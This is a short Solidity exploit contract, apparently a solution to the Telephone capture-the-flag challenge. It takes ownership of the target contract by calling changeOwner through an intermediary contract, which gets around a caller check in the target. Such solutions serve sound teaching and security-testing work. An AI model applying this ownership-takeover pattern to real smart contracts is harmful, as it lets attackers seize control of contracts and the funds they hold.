// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Telephone.sol";

contract TelephoneAttack {
    Telephone public telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}
